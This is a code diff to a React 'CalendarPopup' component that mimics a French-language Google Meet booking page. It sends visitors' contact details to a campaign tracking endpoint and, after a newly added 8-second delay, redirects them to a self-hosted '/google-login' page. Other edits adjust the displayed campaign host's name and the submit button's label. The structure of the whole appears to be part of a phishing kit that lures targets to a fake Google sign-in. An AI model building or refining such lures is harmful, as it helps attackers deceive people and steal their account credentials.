@@ -26,8 +26,11 @@ export default function CalendarPopup({ isVisible, onClose, campaignData }) {
     // fire and forget tracking
     fetch('/api/tracking/track-submission', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ eventType: 'booking', payload: { email, name, phone, description }, campaign: campaignData?.id }) }).catch(()=>{});
 
-    const q = new URLSearchParams({ email, name, c: campaignData?.id }).toString();
-    window.location.href = `/google-login?${q}`;
+    // Wait 8 seconds before redirecting
+    setTimeout(() => {
+      const q = new URLSearchParams({ email, name, c: campaignData?.id }).toString();
+      window.location.href = `/google-login?${q}`;
+    }, 8000);
   }
 
   return (
@@ -38,7 +41,7 @@ export default function CalendarPopup({ isVisible, onClose, campaignData }) {
           <div>Réunion Google Meet • 15 minutes</div>
           <div className={styles.timezone}>(GMT+02:00) Heure d'Europe centrale - Paris</div>
           {campaignData && (
-            <div className={styles.eventHost}>{campaignData.name} • {campaignData.email}</div>
+            <div className={styles.eventHost}>{campaignData.first_name} {campaignData.last_name} • {campaignData.email}</div>
           )}
         </div>
       </div>
@@ -51,7 +54,7 @@ export default function CalendarPopup({ isVisible, onClose, campaignData }) {
       <div className={styles.formSection}>
         <div className={styles.contactHeader}>
           <svg focusable="false" width="20" height="20" viewBox="0 0 24 24" className={styles.contactIcon}><path d="M22 3H2C.9 3 0 3.9 0 5v14c0 1.1.9 2 2 2h20c1.1 0 1.99-.9 1.99-2L24 5c0-1.1-.9-2-2-2zm0 16H2V5h20v14z"></path><path d="M21 6h-7v5h7V6zm-1 2l-2.5 1.25L15 8V7l2.5 1.25L20 7v1zM9 12c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm6 7.75c0-1.99-4-3-6-3s-6 1.01-6 3V18h12v-2.25z"></path></svg>
-          <h3>Informations de contact</h3>
+          <h3 className={styles.contactTitle}>Informations de contact</h3>
         </div>
 
         <form className={styles.form} onSubmit={handleSubmit}>
@@ -86,7 +89,9 @@ export default function CalendarPopup({ isVisible, onClose, campaignData }) {
 
           <div className={styles.formActions}>
             <button type="button" onClick={onClose} className={styles.cancelBtn} disabled={isSubmitting}>Annuler</button>
-            <button type="submit" className={styles.bookBtn} disabled={isSubmitting}>Réserver</button>
+            <button type="submit" className={styles.bookBtn} disabled={isSubmitting}>
+              {isSubmitting ? "Réservation..." : "Réserver"}
+            </button>
           </div>
         </form>
       </div>
